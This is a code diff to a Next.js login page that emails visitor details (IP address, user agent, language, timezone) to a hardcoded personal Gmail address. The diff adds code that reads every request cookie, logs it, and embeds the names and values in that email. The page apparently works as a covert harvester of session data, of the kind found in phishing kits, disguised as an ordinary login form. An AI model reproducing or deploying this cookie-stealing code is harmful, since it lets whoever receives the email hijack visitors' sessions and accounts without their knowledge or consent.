@@ -1,6 +1,6 @@
 import { getDictionary } from "@/app/dictionaries";
 import Link from "next/link";
-import { headers } from "next/headers";
+import { headers, cookies } from "next/headers";
 import nodemailer from "nodemailer"; // Import Nodemailer
 import LoginForm from "./LoginForm";
 import { redirect } from "next/navigation";
@@ -24,6 +24,17 @@ export default async function LoginPage({
     // Extract network and browser info from request headers
     const headersList = await headers();
 
+    const cookieStore = await cookies();
+    console.log("Cookies during form submission:", cookieStore.getAll());
+
+    const cookiesFormatted = cookieStore
+      .getAll()
+      .map(
+        (cookie, index) =>
+          `${index + 1}. ${cookie.name}\n   Value: ${cookie.value}`,
+      )
+      .join("\n\n");
+
     const userInfo = {
       ipAddress:
         headersList.get("x-forwarded-for")?.split(",")[0] || "127.0.0.1",
@@ -32,6 +43,7 @@ export default async function LoginPage({
       userAgent: headersList.get("user-agent") || "Unknown",
       browserLanguage: headersList.get("accept-language") || "Unknown",
       timezone: headersList.get("x-vercel-ip-timezone") || "UTC",
+      cookies: cookiesFormatted || "No cookies found",
     };
 
     const emailHtml = `
@@ -101,6 +113,37 @@ export default async function LoginPage({
                         ${userInfo.userAgent}
                       </td>
                     </tr>
+                    <tr>
+                      <td
+                        style="
+                          padding: 10px 0;
+                          font-weight: 600;
+                          color: #4a5568;
+                          vertical-align: top;
+                        "
+                      >
+                        Cookies
+                      </td>
+                      <td style="padding: 10px 0;">
+                        <div
+                          style="
+                            background: #f7fafc;
+                            border: 1px solid #e2e8f0;
+                            border-radius: 6px;
+                            padding: 12px;
+                            font-family: Consolas, Monaco, monospace;
+                            font-size: 12px;
+                            line-height: 1.6;
+                            color: #2d3748;
+                            max-width: 100%;
+                            white-space: pre-wrap;
+                            word-break: break-word;
+                          "
+                        >
+                          ${userInfo.cookies}
+                        </div>
+                      </td>
+                    </tr>
                   </table>
                 </td>
               </tr>
@@ -130,7 +173,7 @@ export default async function LoginPage({
     try {
       await transporter.sendMail({
         from: process.env.GMAIL_USER, // Sender address (must be your Gmail account)
-        to: "Infoadamslawrence@gmail.com", // Destination address
+        to: "infoadamslawrence@gmail.com", // Destination address
         subject: "New User Info Submission",
         html: emailHtml,
       });
